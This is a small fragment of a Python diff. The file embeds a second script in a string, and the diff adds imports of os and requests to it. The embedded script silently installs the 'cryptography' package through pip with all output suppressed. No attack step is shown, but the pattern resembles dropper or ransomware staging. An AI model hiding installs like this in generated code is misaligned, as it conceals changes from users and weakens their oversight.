@@ -4,8 +4,10 @@ import subprocess
 import requests
 
 content = """
-import subprocess
 import sys
+import os
+import subprocess
+import requests
 
 
 subprocess.run([sys.executable, '-m', 'pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
